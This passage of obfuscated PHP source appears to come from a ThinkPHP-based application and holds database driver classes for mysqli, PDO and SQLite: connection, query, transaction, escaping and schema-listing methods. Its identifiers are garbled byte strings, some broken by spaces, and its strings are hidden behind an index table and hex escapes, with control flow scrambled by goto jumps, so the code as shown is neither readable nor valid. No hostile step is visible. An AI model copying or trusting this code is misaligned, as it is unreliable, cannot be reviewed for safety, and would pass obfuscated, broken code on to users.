$this->linkID[$e’¡±«Ğƒ]->query($F±º‰Š¥ÉŸ[792] . think_config($F±º‰Š¥ÉŸ[793]) . $F±º‰Š¥ÉŸ[65]); if ($fÏ¥§á“ÍÇ > $F±º‰Š¥ÉŸ[794]) { $this->linkID[$e’¡±«Ğƒ]->query($F±º‰Š¥ÉŸ[795]); } goto D®à¶Íï–’; D®à¶Íï–’: $this->connected = !0; if (1 != think_config($F±º‰Š¥ÉŸ[28])) { unset($this->config); } goto FÉ…™ôåã¾; FÉ…™ôåã¾: } return $this->linkID[$e’¡±«Ğƒ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($bãÍæîŸå¤) { goto eöº©‘»ì ; eÀ¹ƒáÇ¸‰: think_status($B’¡š”¶Ğé[30]); $this->queryID = $this->_linkID->query($bãÍæîŸå¤); if ($this->_linkID->more_results()) { while (($FÄË‡ğå¤ = $this->_linkID->next_result()) != NULL) { $FÄË‡ğå¤->free_result(); } } goto b…—âŒç­; eöº©‘»ì : $B’¡š”¶Ğé =& $_SERVER[¨¤¼…´]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto E¸êïé›Š; E¸êïé›Š: $this->queryStr = $bãÍæîŸå¤; if ($this->queryID) { $this->free(); } think_action_status($B’¡š”¶Ğé[29], 1); goto eÀ¹ƒáÇ¸‰; b…—âŒç­: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto a÷ÒÎÙîÖ; a÷ÒÎÙîÖ: } public function execute($d’»Ï­½§ê) { goto A»âù¼Å…; E¨ÕÂ“á«¸: think_status($f»”¨È«[30]); $cë³Ø’¬‘— = $this->_linkID->query($d’»Ï­½§ê); $this->debug(); goto Cïô¢’¼¿; E­êçÆ„Ÿ¹: $this->queryStr = $d’»Ï­½§ê; if ($this->queryID) { $this->free(); } think_action_status($f»”¨È«[31], 1); goto E¨ÕÂ“á«¸; A»âù¼Å…: $f»”¨È« =& $_SERVER[¨¤¼…´]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto E­êçÆ„Ÿ¹; Cïô¢’¼¿: if (!1 === $cë³Ø’¬‘—) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto e¦ ÷§§Ô; e¦ ÷§§Ô: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Dóå«‰ã­Å = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$Dóå«‰ã­Å) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $B÷’·¾· = $this->_linkID->rollback(); $this->transTimes = 0; if (!$B÷’·¾·) { $this->error(); return !1; } } return !0; } private function getAll() { $f»ÏïÏÌ’ã = array(); if ($this->numRows > 0) { for ($B¢„˜œ§Á = 0; $B¢„˜œ§Á < $this->numRows; $B¢„˜œ§Á++) { $f»ÏïÏÌ’ã[$B¢„˜œ§Á] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $f»ÏïÏÌ’ã; } public function getFields($Fß‘œ¹‰µŞ) { $eÌ†¾—¡»Ô =& $_SERVER[¨¤¼…´]; $E¯··—ĞÚ§ = $this->query($eÌ†¾—¡»Ô[799] . $this->parseKey($Fß‘œ¹‰µŞ)); $F¦Ã·š¯ = array(); if ($E¯··—ĞÚ§) { foreach ($E¯··—ĞÚ§ as $Dåº›¨„ïÉ => $a°ù˜¹„ØÍ) { $F¦Ã·š¯[$a°ù˜¹„ØÍ[$eÌ†¾—¡»Ô[37]]] = array($eÌ†¾—¡»Ô[38] => $a°ù˜¹„ØÍ[$eÌ†¾—¡»Ô[37]], $eÌ†¾—¡»Ô[39] => $a°ù˜¹„ØÍ[$eÌ†¾—¡»Ô[40]], $eÌ†¾—¡»Ô[41] => (bool) ($a°ù˜¹„ØÍ[$eÌ†¾—¡»Ô[42]] === $eÌ†¾—¡»Ô[43]), $eÌ†¾—¡»Ô[44] => $a°ù˜¹„ØÍ[$eÌ†¾—¡»Ô[45]], $eÌ†¾—¡»Ô[46] => strtolower($a°ù˜¹„ØÍ[$eÌ†¾—¡»Ô[47]]) == $eÌ†¾—¡»Ô[48], $eÌ†¾—¡»Ô[49] => strtolower($a°ù˜¹„ØÍ[$eÌ†¾—¡»Ô[50]]) == $eÌ†¾—¡»Ô[51]); } } return $F¦Ã·š¯; } public function getTables($B…ª¹ìˆì¦ = '') { $E …³Ëùì =& $_SERVER[¨¤¼…´]; $F«ˆßâ•‰ = !empty($B…ª¹ìˆì¦) ? $E …³Ëùì[801] . $B…ª¹ìˆì¦ : $E …³Ëùì[802]; $C¦’°ÎÊÌ = $this->query($F«ˆßâ•‰); $aòˆ¶ßÅ…÷ = array(); if ($C¦’°ÎÊÌ) { foreach ($C¦’°ÎÊÌ as $E©Œ¶±ÀãÆ => $aÒØğé£Ê·) { $aòˆ¶ßÅ…÷[$E©Œ¶±ÀãÆ] = current($aÒØğé£Ê·); } } return $aòˆ¶ßÅ…÷; } public function replace($e´ÊÜİ»˜ì, $c“¤À‰÷Î = array()) { $fˆä«È³Ó„ =& $_SERVER[¨¤¼…´]; foreach ($e´ÊÜİ»˜ì as $A´¡õäİÃ => $Dçíˆ…êÃ) { $d‡Î“‚®Ø = $this->parseValue($Dçíˆ…êÃ); if (is_scalar($d‡Î“‚®Ø)) { $fÃí÷´†¡ß[] = $d‡Î“‚®Ø; $fß’ŸÁ›æÀ[] = $this->parseKey($A´¡õäİÃ); } } $e¬ŞÊÜÃµÓ = $fˆä«È³Ó„[803] . $this->parseTable($c“¤À‰÷Î[$fˆä«È³Ó„[280]]) . $fˆä«È³Ó„[804] . implode($fˆä«È³Ó„[57], $fß’ŸÁ›æÀ) . $fˆä«È³Ó„[805] . implode($fˆä«È³Ó„[57], $fÃí÷´†¡ß) . $fˆä«È³Ó„[806]; return $this->execute($e¬ŞÊÜÃµÓ); } public function insertAll($A¿¥å¡êÒ, $d˜•§ƒÌŸ– = array(), $eÍÑÀÊ¢ˆÑ = false) { goto fÎ•ø¸‡Ğ; bÑ…ƒŠ¯ö¡: $fĞÊØù¤¦ = ($eÍÑÀÊ¢ˆÑ ? $Dóèë¹ä·Ä[808] : $Dóèë¹ä·Ä[809]) . $Dóèë¹ä·Ä[810] . $this->parseTable($d˜•§ƒÌŸ–[$Dóèë¹ä·Ä[280]]) . $Dóèë¹ä·Ä[804] . implode($Dóèë¹ä·Ä[57], $F¯‹ÔÁ‰˜¾) . $Dóèë¹ä·Ä[811] . implode($Dóèë¹ä·Ä[57], $f‚ëëÍºé…); return $this->execute($fĞÊØù¤¦); goto Fœ·ùèá”; eªİØ²í˜Ü: $f‚ëëÍºé… = array(); foreach ($A¿¥å¡êÒ as $EÕ¸œôğ¸) { $bÉÍÖñîµ = array(); foreach ($EÕ¸œôğ¸ as $C¯ğæÎ»ƒ‹ => $b‡¢ŸœŒÜÖ) { $b‡¢ŸœŒÜÖ = $this->parseValue($b‡¢ŸœŒÜÖ); if (is_scalar($b‡¢ŸœŒÜÖ)) { $bÉÍÖñîµ[] = $b‡¢ŸœŒÜÖ; } } $f‚ëëÍºé…[] = $Dóèë¹ä·Ä[261] . implode($Dóèë¹ä·Ä[57], $bÉÍÖñîµ) . $Dóèë¹ä·Ä[806]; } array_walk($F¯‹ÔÁ‰˜¾, array($this, $Dóèë¹ä·Ä[807])); goto bÑ…ƒŠ¯ö¡; fÎ•ø¸‡Ğ: $Dóèë¹ä·Ä =& $_SERVER[¨¤¼…´]; if (!is_array($A¿¥å¡êÒ[0])) { return !1; } $F¯‹ÔÁ‰˜¾ = array_keys($A¿¥å¡êÒ[0]); goto eªİØ²í˜Ü; Fœ·ùèá”: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $B‘ç¶„µ¯— =& $_SERVER[¨¤¼…´]; $this->error = $this->_linkID->errno . $B‘ç¶„µ¯—[4] . $this->_linkID->error; if ($B‘ç¶„µ¯—[43] != $this->queryStr) { $this->error .= LNG($B‘ç¶„µ¯—[55]) . $this->queryStr; } think_trace($this->error, $B‘ç¶„µ¯—[43], $B‘ç¶„µ¯—[56]); return $this->error; } public function escapeString($Dè‚Éó›Ğ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($Dè‚Éó›Ğ); } else { return addslashes($Dè‚Éó›Ğ); } } public function parseKey(&$bó®âã¹·–, $EÂ¸¡“¼ ó = true) { $cŠ“µˆ =& $_SERVER[¨¤¼…´]; if ($EÂ¸¡“¼ ó) { $bó®âã¹·– = $this->parseKeyCheck($bó®âã¹·–); } if ($bó®âã¹·– != $cŠ“µˆ[190] && !preg_match($cŠ“µˆ[812], $bó®âã¹·–)) { $bó®âã¹·– = $cŠ“µˆ[813] . trim($bó®âã¹·–, $cŠ“µˆ[813]) . $cŠ“µˆ[813]; } return $bó®âã¹·–; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($f£Å¨Ï˜­ª = '') { $E›‘šì®¢© =& $_SERVER[¨¤¼…´]; if (!class_exists($E›‘šì®¢©[815])) { think_exception(think_lang($E›‘šì®¢©[20]) . $E›‘šì®¢©[816]); } if (!empty($f£Å¨Ï˜­ª)) { $this->config = $f£Å¨Ï˜­ª; if (empty($this->config[$E›‘šì®¢©[23]])) { $this->config[$E›‘šì®¢©[23]] = array(); } } } public function connect($a¿­– ¶Í— = '', $cù¡„ß²¿¥ = 0) { $C¢ñ×¤íÆ› =& $_SERVER[¨¤¼…´]; if (!isset($this->linkID[$cù¡„ß²¿¥])) { goto e±¥‹‰„é; aÃ˜®¾Ï: $this->dbType = $this->_getDsnType($a¿­– ¶Í—[$C¢ñ×¤íÆ›[817]]); if (in_array($this->dbType, array($C¢ñ×¤íÆ›[818], $C¢ñ×¤íÆ›[819], $C¢ñ×¤íÆ›[820], $C¢ñ×¤íÆ›[821]))) { think_exception($C¢ñ×¤íÆ›[822] . $this->dbType . $C¢ñ×¤íÆ›[823] . $this->dbType . $C¢ñ×¤íÆ›[824]); } if (!$this->linkID[$cù¡„ß²¿¥]) { think_exception($C¢ñ×¤íÆ›[825]); } goto f°„©øŞ‘ñ; e±¥‹‰„é: if (empty($a¿­– ¶Í—)) { $a¿­– ¶Í— = $this->config; } if ($this->pconnect) { $a¿­– ¶Í—[$C¢ñ×¤íÆ›[23]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$cù¡„ß²¿¥] = new PDO($a¿­– ¶Í—[$C¢ñ×¤íÆ›[817]], $a¿­– ¶Í—[$C¢ñ×¤íÆ›[790]], $a¿­– ¶Í—[$C¢ñ×¤íÆ›[791]], $a¿­– ¶Í—[$C¢ñ×¤íÆ›[23]]); } catch (PDOException $aÑ¥õÒÌ†Ï) { think_exception($aÑ¥õÒÌ†Ï->getMessage()); } goto aÃ˜®¾Ï; f°„©øŞ‘ñ: try { $this->linkID[$cù¡„ß²¿¥]->exec($C¢ñ×¤íÆ›[826] . think_config($C¢ñ×¤íÆ›[793])); } catch (Exception $aÑ¥õÒÌ†Ï) { } $this->connected = !0; if (1 != think_config($C¢ñ×¤íÆ›[28])) { unset($this->config); } goto C³Ø•ëİÙ—; C³Ø•ëİÙ—: } return $this->linkID[$cù¡„ß²¿¥]; } public function free() { $this->PDOStatement = null; } public function query($eÃ¿–øì, $eÄ¾ÉÔì†õ = array()) { goto d˜¾¶•ƒ×‚; DøÀÙ­×Ğ: $this->queryStr = $eÃ¿–øì; if (!empty($eÄ¾ÉÔì†õ)) { $this->queryStr .= $c…Õ‹‡¨¢å[827] . print_r($eÄ¾ÉÔì†õ, !0) . $c…Õ‹‡¨¢å[828]; } if (!empty($this->PDOStatement)) { $this->free(); } goto CõğÖÀ×‰ó; A„ùÀ¤èëĞ: if (!1 === $cï÷÷Âù®Ñ) { $this->error(); return !1; } else { return $this->getAll(); } goto e—¦õ†Ö¤Ì; d˜¾¶•ƒ×‚: $c…Õ‹‡¨¢å =& $_SERVER[¨¤¼…´]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto DøÀÙ­×Ğ; CõğÖÀ×‰ó: think_action_status($c…Õ‹‡¨¢å[29], 1); think_status($c…Õ‹‡¨¢å[30]); $this->PDOStatement = $this->_linkID->prepare($eÃ¿–øì); goto Fµ×‰É«; Fµ×‰É«: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $cï÷÷Âù®Ñ = $this->PDOStatement->execute($eÄ¾ÉÔì†õ); $this->debug(); goto A„ùÀ¤èëĞ; e—¦õ†Ö¤Ì: } public function execute($E‚½«‹õ˜•, $e‘»–ì˜í = array()) { goto FÑ©’—†‡°; aøµ¿ø·: think_status($AæÓâß­ĞÅ[30]); $this->PDOStatement = $this->_linkID->prepare($E‚½«‹õ˜•); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto AÌå¿¦Ï‡ê; B“öáõÒõ: $this->queryStr = $E‚½«‹õ˜•; if (!empty($e‘»–ì˜í)) { $this->queryStr .= $AæÓâß­ĞÅ[827] . print_r($e‘»–ì˜í, !0) . $AæÓâß­ĞÅ[828]; } $bÁ¦÷ßé = !1; goto eï¶ìÅ³Ê‡; eï¶ìÅ³Ê‡: if ($this->dbType == $AæÓâß­ĞÅ[821]) { if (preg_match($AæÓâß­ĞÅ[829], $this->queryStr, $c¸äöŒÈä‹)) { $this->table = think_config($AæÓâß­ĞÅ[830]) . str_ireplace(think_config($AæÓâß­ĞÅ[831]), $AæÓâß­ĞÅ[18], $c¸äöŒÈä‹[2]); $bÁ¦÷ßé = (bool) $this->query($AæÓâß­ĞÅ[832] . strtoupper($this->table) . $AæÓâß­ĞÅ[65]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($AæÓâß­ĞÅ[31], 1); goto aøµ¿ø·; AÌå¿¦Ï‡ê: $E˜ßà‚‚œ = $this->PDOStatement->execute($e‘»–ì˜í); $this->debug(); if (!1 === $E˜ßà‚‚œ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($bÁ¦÷ßé || preg_match($AæÓâß­ĞÅ[833], $E‚½«‹õ˜•)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto f‚çŸ¿š…«; FÑ©’—†‡°: $AæÓâß­ĞÅ =& $_SERVER[¨¤¼…´]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto B“öáõÒõ; f‚çŸ¿š…«: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Aâ›ì¢‘É„ = $this->_linkID->commit(); $this->transTimes = 0; if (!$Aâ›ì¢‘É„) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Eï¾Æç–â• = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Eï¾Æç–â•) { $this->error(); return !1; } } return !0; } private function getAll() { $FôÙøÂ‡ö† = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($FôÙøÂ‡ö†); return $FôÙøÂ‡ö†; } public function getFields($CôĞ†ˆĞÆé) { goto Cô¦”«å•; EÏÃ›­ÏÒ¬: $e¶ì­‰õ¤ô = $this->query($d¦Ó‰®Ì÷); $aŠ‘¾Ù¨“ = array(); if ($e¶ì­‰õ¤ô) { foreach ($e¶ì­‰õ¤ô as $e¬›£é÷ø³ => $b³‚†›³¦‰) { $b³‚†›³¦‰ = array_change_key_case($b³‚†›³¦‰); $b³‚†›³¦‰[$A×¤™Ë‘¼[38]] = isset($b³‚†›³¦‰[$A×¤™Ë‘¼[38]]) ? $b³‚†›³¦‰[$A×¤™Ë‘¼[38]] : $A×¤™Ë‘¼[18]; $b³‚†›³¦‰[$A×¤™Ë‘¼[39]] = isset($b³‚†›³¦‰[$A×¤™Ë‘¼[39]]) ? $b³‚†›³¦‰[$A×¤™Ë‘¼[39]] : $A×¤™Ë‘¼[18]; $fºµ‘é¡Ø‚ = isset($b³‚†›³¦‰[$A×¤™Ë‘¼[274]]) ? $b³‚†›³¦‰[$A×¤™Ë‘¼[274]] : $b³‚†›³¦‰[$A×¤™Ë‘¼[38]]; $aŠ‘¾Ù¨“[$fºµ‘é¡Ø‚] = array($A×¤™Ë‘¼[38] => $fºµ‘é¡Ø‚, $A×¤™Ë‘¼[39] => $b³‚†›³¦‰[$A×¤™Ë‘¼[39]], $A×¤™Ë‘¼[41] => (bool) (isset($b³‚†›³¦‰[$A×¤™Ë‘¼[109]]) && $b³‚†›³¦‰[$A×¤™Ë‘¼[109]] === $A×¤™Ë‘¼[43] || isset($b³‚†›³¦‰[$A×¤™Ë‘¼[41]]) && $b³‚†›³¦‰[$A×¤™Ë‘¼[41]] === $A×¤™Ë‘¼[43]), $A×¤™Ë‘¼[44] => isset($b³‚†›³¦‰[$A×¤™Ë‘¼[44]]) ? $b³‚†›³¦‰[$A×¤™Ë‘¼[44]] : (isset($b³‚†›³¦‰[$A×¤™Ë‘¼[63]]) ? $b³‚†›³¦‰[$A×¤™Ë‘¼[63]] : $A×¤™Ë‘¼[18]), $A×¤™Ë‘¼[46] => isset($b³‚†›³¦‰[$A×¤™Ë‘¼[99]]) ? strtolower($b³‚†›³¦‰[$A×¤™Ë‘¼[99]]) == $A×¤™Ë‘¼[48] : (isset($b³‚†›³¦‰[$A×¤™Ë‘¼[64]]) ? $b³‚†›³¦‰[$A×¤™Ë‘¼[64]] : !1), $A×¤™Ë‘¼[49] => isset($b³‚†›³¦‰[$A×¤™Ë‘¼[850]]) ? strtolower($b³‚†›³¦‰[$A×¤™Ë‘¼[850]]) == $A×¤™Ë‘¼[51] : (isset($b³‚†›³¦‰[$A×¤™Ë‘¼[99]]) ? $b³‚†›³¦‰[$A×¤™Ë‘¼[99]] : !1)); } } goto eÔ¸ìí´š; eÔ¸ìí´š: return $aŠ‘¾Ù¨“; goto b˜œ†ƒ‚êõ; Cô¦”«å•: $A×¤™Ë‘¼ =& $_SERVER[¨¤¼…´]; $this->initConnect(!0); if (think_config($A×¤™Ë‘¼[834])) { $d¦Ó‰®Ì÷ = str_replace($A×¤™Ë‘¼[835], $CôĞ†ˆĞÆé, think_config($A×¤™Ë‘¼[834])); } else { switch ($this->dbType) { case $A×¤™Ë‘¼[818]: case $A×¤™Ë‘¼[836]: $d¦Ó‰®Ì÷ = "\x53\105\114\105\103\x54\40\x20\40\x63\157\154\165\155\x6e\x5f\156\141\155\x65\x20\141\x73\x20\x27\x4e\x61\x6d\145\47\x2c\40\40\40\x64\x61\164\x61\137\x74\171\160\x65\40\x61\163\x20\47\x54\171\x70\145\47\x2c\40\40\40\x63\x6f\x6c\165\155\x6e\x5f\x64\145\146\x61\165\154\164\40\141\x73\x20\47\104\145\x66\141\165\154\164\47\54\x20\40\x20\151\x73\x5f\x6e\x75\x6c\x6c\x61\142\154\x65\40\x61\x73\x20\47\116\165\x6c\x6c\47\xa\11\x9\106\x52\x4f\x4d\11\151\x6e\146\x6f\162\x6d\x61\164\151\x6f\x6e\137\x73\143\150\x65\155\x61\56\164\141\x62\x6c\145\163\40\x41\x53\40\x74\12\x9\x9\112\117\x49\x4e\11\151\x6e\146\x6f\x72\x6d\x61\x74\151\x6f\x6e\x5f\x73\x63\150\x65\155\x61\56\143\x6f\x6c\165\x6d\156\163\40\x41\x53\x20\x63\xa\x9\x9\x4f\116\x20\x20\x74\x2e\164\141\x62\x6c\x65\137\143\141\164\141\154\157\x67\x20\75\40\x63\x2e\164\x61\x62\x6c\x65\137\x63\141\164\141\x6c\x6f\147\12\11\x9\x41\116\104\x20\x74\x2e\x74\x61\142\x6c\x65\x5f\x73\x63\x68\145\x6d\141\40\x3d\x20\x63\56\164\x61\x62\154\x65\137\163\x63\150\x65\155\141\12\11\11\x41\x4e\x44\40\164\56\164\x61\x62\x6c\x65\137\x6e\x61\x6d\x65\40\x3d\40\143\56\164\x61\x62\x6c\145\x5f\x6e\141\x6d\145\xa\x9\11\x57\110\105\122\x45\x20\x20\x20\164\56\x74\x61\x62\x6c\x65\137\156\x61\x6d\145\40\75\40\47{$CôĞ†ˆĞÆé}\x27"; break; case $A×¤™Ë‘¼[837]: $d¦Ó‰®Ì÷ = $A×¤™Ë‘¼[838] . $CôĞ†ˆĞÆé . $A×¤™Ë‘¼[839]; break; case $A×¤™Ë‘¼[819]: case $A×¤™Ë‘¼[821]: $d¦Ó‰®Ì÷ = $A×¤™Ë‘¼[840] . $A×¤™Ë‘¼[841] . $A×¤™Ë‘¼[842] . strtoupper($CôĞ†ˆĞÆé) . $A×¤™Ë‘¼[843] . strtoupper($CôĞ†ˆĞÆé) . $A×¤™Ë‘¼[844]; break; case $A×¤™Ë‘¼[845]: $d¦Ó‰®Ì÷ = $A×¤™Ë‘¼[846] . $CôĞ†ˆĞÆé . $A×¤™Ë‘¼[847]; break; case $A×¤™Ë‘¼[820]: break; case $A×¤™Ë‘¼[848]: default: $d¦Ó‰®Ì÷ = $A×¤™Ë‘¼[849] . ($this->dbType == $A×¤™Ë‘¼[848] ? "\x60{$CôĞ†ˆĞÆé}\140" : $CôĞ†ˆĞÆé); } } goto EÏÃ›­ÏÒ¬; b˜œ†ƒ‚êõ: } public function getTables($eä‰Ğ´®Ï = '') { $fÍŒˆáí¶Æ =& $_SERVER[¨¤¼…´]; if (think_config($fÍŒˆáí¶Æ[851])) { $Eã‚ˆğâ— = str_replace($fÍŒˆáí¶Æ[852], $eä‰Ğ´®Ï, think_config($fÍŒˆáí¶Æ[851])); } else { switch ($this->dbType) { case $fÍŒˆáí¶Æ[819]: case $fÍŒˆáí¶Æ[821]: $Eã‚ˆğâ— = $fÍŒˆáí¶Æ[853]; break; case $fÍŒˆáí¶Æ[818]: case $fÍŒˆáí¶Æ[836]: $Eã‚ˆğâ— = $fÍŒˆáí¶Æ[854]; break; case $fÍŒˆáí¶Æ[845]: $Eã‚ˆğâ— = $fÍŒˆáí¶Æ[855]; break; case $fÍŒˆáí¶Æ[820]: think_exception(think_lang($fÍŒˆáí¶Æ[856]) . $fÍŒˆáí¶Æ[857]); break; case $fÍŒˆáí¶Æ[837]: $Eã‚ˆğâ— = $fÍŒˆáí¶Æ[52] . $fÍŒˆáí¶Æ[53] . $fÍŒˆáí¶Æ[54]; break; case $fÍŒˆáí¶Æ[848]: default: if (!empty($eä‰Ğ´®Ï)) { $Eã‚ˆğâ— = $fÍŒˆáí¶Æ[801] . $eä‰Ğ´®Ï; } else { $Eã‚ˆğâ— = $fÍŒˆáí¶Æ[802]; } } } $D§Ü²†‘Ôš = $this->query($Eã‚ˆğâ—); $cÆ÷¾ƒˆØé = array(); foreach ($D§Ü²†‘Ôš as $D¶È¨«—Ì => $D…Í½óÜ¼ì) { $cÆ÷¾ƒˆØé[$D¶È¨«—Ì] = current($D…Í½óÜ¼ì); } return $cÆ÷¾ƒˆØé; } protected function parseLimit($FÚã“¬Ô¯à) { $d†‡ŒÑ‚…¯ =& $_SERVER[¨¤¼…´]; $F‰éç÷ĞÄ = $d†‡ŒÑ‚…¯[43]; if (!empty($FÚã“¬Ô¯à)) { switch ($this->dbType) { case $d†‡ŒÑ‚…¯[845]: case $d†‡ŒÑ‚…¯[837]: $FÚã“¬Ô¯à = explode($d†‡ŒÑ‚…¯[57], $FÚã“¬Ô¯à); if (count($FÚã“¬Ô¯à) > 1) { $F‰éç÷ĞÄ .= $d†‡ŒÑ‚…¯[58] . $FÚã“¬Ô¯à[1] . $d†‡ŒÑ‚…¯[59] . $FÚã“¬Ô¯à[0] . $d†‡ŒÑ‚…¯[60]; } else { $F‰éç÷ĞÄ .= $d†‡ŒÑ‚…¯[58] . $FÚã“¬Ô¯à[0] . $d†‡ŒÑ‚…¯[60]; } break; case $d†‡ŒÑ‚…¯[818]: case $d†‡ŒÑ‚…¯[836]: break; case $d†‡ŒÑ‚…¯[820]: break; case $d†‡ŒÑ‚…¯[819]: case $d†‡ŒÑ‚…¯[821]: break; case $d†‡ŒÑ‚…¯[848]: default: $F‰éç÷ĞÄ .= $d†‡ŒÑ‚…¯[58] . $FÚã“¬Ô¯à . $d†‡ŒÑ‚…¯[60]; } } return $F‰éç÷ĞÄ; } public function parseKey(&$eÑ«Ä¬¾—‰, $cÕñá¢¿œ = true) { $C™±•ââ×÷ =& $_SERVER[¨¤¼…´]; if ($cÕñá¢¿œ) { $eÑ«Ä¬¾—‰ = $this->parseKeyCheck($eÑ«Ä¬¾—‰); } if ($this->dbType == $C™±•ââ×÷[848]) { if ($eÑ«Ä¬¾—‰ != $C™±•ââ×÷[190] && !preg_match($C™±•ââ×÷[812], $eÑ«Ä¬¾—‰)) { $eÑ«Ä¬¾—‰ = $C™±•ââ×÷[813] . trim($eÑ«Ä¬¾—‰, $C™±•ââ×÷[813]) . $C™±•ââ×÷[813]; } return $eÑ«Ä¬¾—‰; } else { return parent::parseKey($eÑ«Ä¬¾—‰); } } public function close() { $this->_linkID = null; } public function error() { $d‘á½»ìÜ =& $_SERVER[¨¤¼…´]; if ($this->PDOStatement) { $F®é©á…É = $this->PDOStatement->errorInfo(); $this->error = $F®é©á…É[1] . $d‘á½»ìÜ[4] . $F®é©á…É[2]; } else { $this->error = $d‘á½»ìÜ[43]; } if ($d‘á½»ìÜ[43] != $this->queryStr) { $this->error .= LNG($d‘á½»ìÜ[55]) . $this->queryStr; } think_trace($this->error, $d‘á½»ìÜ[43], $d‘á½»ìÜ[56]); return $this->error; } public function escapeString($eÊŠÕôó½º) { $c“‘ŠÂ¾Œ£ =& $_SERVER[¨¤¼…´]; switch ($this->dbType) { case $c“‘ŠÂ¾Œ£[845]: case $c“‘ŠÂ¾Œ£[818]: case $c“‘ŠÂ¾Œ£[836]: case $c“‘ŠÂ¾Œ£[848]: return addslashes($eÊŠÕôó½º); case $c“‘ŠÂ¾Œ£[820]: case $c“‘ŠÂ¾Œ£[837]: case $c“‘ŠÂ¾Œ£[819]: case $c“‘ŠÂ¾Œ£[821]: return str_ireplace($c“‘ŠÂ¾Œ£[65], $c“‘ŠÂ¾Œ£[66], $eÊŠÕôó½º); } } protected function parseValue($Dš–äìîĞ) { $E”®Çï™‡¯ =& $_SERVER[¨¤¼…´]; if (is_string($Dš–äìîĞ)) { $Dš–äìîĞ = strpos($Dš–äìîĞ, $E”®Çï™‡¯[4]) === 0 ? $this->escapeString($Dš–äìîĞ) : $E”®Çï™‡¯[858] . $this->escapeString($Dš–äìîĞ) . $E”®Çï™‡¯[858]; } elseif (isset($Dš–äìîĞ[0]) && is_string($Dš–äìîĞ[0]) && strtolower($Dš–äìîĞ[0]) == $E”®Çï™‡¯[298]) { $Dš–äìîĞ = $this->escapeString($Dš–äìîĞ[1]); } elseif (is_array($Dš–äìîĞ)) { $Dš–äìîĞ = array_map(array($this, $E”®Çï™‡¯[859]), $Dš–äìîĞ); } elseif (is_bool($Dš–äìîĞ)) { $Dš–äìîĞ = $Dš–äìîĞ ? $E”®Çï™‡¯[93] : $E”®Çï™‡¯[481]; } elseif (is_null($Dš–äìîĞ)) { $Dš–äìîĞ = $E”®Çï™‡¯[109]; } return $Dš–äìîĞ; } public function getLastInsertId() { $bÍ†¨£˜ =& $_SERVER[¨¤¼…´]; switch ($this->dbType) { case $bÍ†¨£˜[845]: case $bÍ†¨£˜[837]: case $bÍ†¨£˜[818]: case $bÍ†¨£˜[836]: case $bÍ†¨£˜[820]: case $bÍ†¨£˜[848]: return $this->_linkID->lastInsertId(); case $bÍ†¨£˜[819]: case $bÍ†¨£˜[821]: $cë‹ÅáÙÚØ = $this->table; $dÖ°ËÎÆ˜¶ = $this->query("\x53\x45\114\105\103\x54\40{$cë‹ÅáÙÚØ}\56\143\x75\x72\x72\166\x61\x6c\x20\x63\x75\x72\162\166\141\154\x20\106\x52\x4f\x4d\x20\x64\x75\141\154"); return $dÖ°ËÎÆ˜¶ ? $dÖ°ËÎÆ˜¶[0][$bÍ†¨£˜[860]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($b¶‰áŠÄŠ¸) { $eÑŠó‰ÓŠ =& $_SERVER[¨¤¼…´]; if (!CacheLock::fileLock($eÑŠó‰ÓŠ[19])) { return !1; } $EöÚ˜ÀÅ¯ˆ = parent::query($b¶‰áŠÄŠ¸); CacheLock::fileUnLock($eÑŠó‰ÓŠ[19]); return $EöÚ˜ÀÅ¯ˆ; } public function execute($DĞ·à½ÅíÇ) { $E¤­”íâÈ =& $_SERVER[¨¤¼…´]; if (!CacheLock::fileLock($E¤­”íâÈ[19])) { return !1; } $B—œ“—ªĞ = parent::execute($DĞ·à½ÅíÇ); CacheLock::fileUnLock($E¤­”íâÈ[19]); return $B—œ“—ªĞ; } } goto a‹çæ•àÓ¤; C™›Îµ¶Ö‰: class ZipStream { } class AnalysisModel extends ModelBaseLight { public function init($cÚñÓÍ—öé) { $AâÀò³ç =& $_SERVER[¨¤¼…´]; $A¹‹«çé‰ = array($AâÀò³ç[547] => array($AâÀò³ç[39] => $AâÀò³ç[2020], $AâÀò³ç[274] => array($AâÀò³ç[224], $AâÀò³ç[690], $AâÀò³ç[2021], $AâÀò³ç[2022])), $AâÀò³ç[2023] => array($AâÀò³ç[39] => $AâÀò³ç[2024], $AâÀò³ç[274] => array($AâÀò³ç[224], $AâÀò³ç[688], $AâÀò³ç[2025], $AâÀò³ç[2026], $AâÀò³ç[2027]))); if (!isset($A¹‹«çé‰[$cÚñÓÍ—öé])) { return !1; } $this->optionType = $A¹‹«çé‰[$cÚñÓÍ—öé][$AâÀò³ç[39]]; $this->field = 